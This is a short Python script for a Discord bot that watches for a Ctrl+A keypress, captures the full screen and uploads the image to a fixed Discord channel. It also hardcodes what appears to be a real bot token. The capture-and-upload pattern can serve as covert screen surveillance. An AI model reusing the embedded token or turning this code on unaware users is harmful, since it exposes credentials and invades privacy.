#!/usr/bin/env python
# -*- coding: utf-8 -*-

import discord
from discord.ext import commands, tasks
import asyncio
from PIL import ImageGrab
from io import BytesIO
import keyboard

client = discord.Client()
TOKEN = "ODA5NjQzMTEwNDg0MTQ4MjI0.YCYE5w.r52DUZ3qjOChZUY_Avz5AmH_QH8"


def take_screenshot():
    return ImageGrab.grab()


@client.event
async def on_ready():
    print("Logged in as")
    print(client.user.name)
    print(client.user.id)
    print("------")
    screenshot_takeNsend.start()


@tasks.loop(seconds=0.2)
async def screenshot_takeNsend():
    channel = client.get_channel(809642981753225256)
    if keyboard.is_pressed("ctrl + a"):
        with BytesIO() as image_binary:
            take_screenshot().save(image_binary, "PNG")
            image_binary.seek(0)
            await channel.send(file=discord.File(fp=image_binary, filename="image.png"))
        print("Screenshot sent")
        await asyncio.sleep(1)


if __name__ == "__main__":
    client.run(TOKEN)
